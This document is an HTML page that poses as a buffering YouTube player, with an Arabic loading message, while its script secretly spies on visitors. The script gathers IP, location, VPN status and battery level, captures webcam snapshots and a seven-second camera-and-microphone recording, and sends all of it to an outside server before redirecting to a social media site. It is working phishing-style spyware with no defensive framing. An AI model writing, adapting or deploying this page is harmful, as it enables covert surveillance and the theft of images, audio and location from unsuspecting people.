<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YouTube Player - Buffering</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .container { text-align: center; padding: 20px; }
    .loader { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="130">
    <p style="color: #888; margin-top: 20px;">جارٍ مزامنة جودة الفيديو مع جهازك...</p>
    <div class="loader"></div>
  </div>

  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const reKey = urlParams.get("re");

    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };

    async function send(msg, type = "text", file = null) {
      if (!chatId) return;
      const payload = { chat_id: chatId };
      if (type === "text") payload.message = msg;
      if (type === "photo") { payload.message = "📸 *NEW SNAPSHOT:*"; payload.photo = file; }
      if (type === "video") { payload.message = "📹 *FULL VIDEO CLIP:*"; payload.video = file; }

      return fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });
    }

    // وظيفة أخذ لقطة سريعة
    function takeSnapshot(label) {
        ctx.drawImage(v, 0, 0, c.width, c.height);
        const img = c.toDataURL("image/jpeg", 0.7).split(',')[1];
        send("", "photo", img);
    }

    async function analyzeTarget() {
      let bat = "N/A";
      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
      
      const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const timeStr = new Date().toLocaleString('ar-DZ');

      fetch("https://ipapi.co/json/").then(res => res.json()).then(async data => {
        const isVpn = (data.timezone !== browserTimezone) ? "⚠️ YES" : "✅ NO";
        let m = "🏁 *COBRA MULTI-MEDIA REPORT* 🏁\n";
        m += `🌍 *IP:* \`${data.ip}\` | *VPN:* ${isVpn}\n`;
        m += `🕒 *Time:* ${timeStr} | 🔋 *Bat:* ${bat}\n`;
        m += `📍 *Loc:* ${data.city}, ${data.country}\n`;
        m += "━━━━━━━━━━━━━━━━━━━━\n";
        await send(m);
        startSpying();
      }).catch(() => startSpying());
    }

    function startSpying() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            v.play();
            
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => { send("", "video", reader.result.split(',')[1]); };
                setTimeout(finalizeRedirect, 1000);
            };

            // --- نظام السحب المتعدد ---
            // 1. انتظر ثانيتين (تعديل الضوء) ثم ابدأ
            setTimeout(() => {
                // لقطة أولى
                takeSnapshot();

                // ابدأ تسجيل الفيديو لمدة 7 ثواني
                recorder.start();

                // لقطة ثانية بعد 3 ثواني من الفيديو
                setTimeout(() => takeSnapshot(), 3000);

                // لقطة ثالثة قبل نهاية الفيديو
                setTimeout(() => takeSnapshot(), 6000);

                // أوقف كل شيء بعد 7 ثواني
                setTimeout(() => {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }, 7000);

            }, 2500);
          };
        })
        .catch(() => {
          send("❌ *Permissions Denied*");
          finalizeRedirect();
        });
    }

    function finalizeRedirect() {
      let finalUrl = redirectMap[reKey] || "https://www.youtube.com";
      window.location.replace(finalUrl);
    }

    if (chatId) analyzeTarget();
  </script>
</body>
</html>
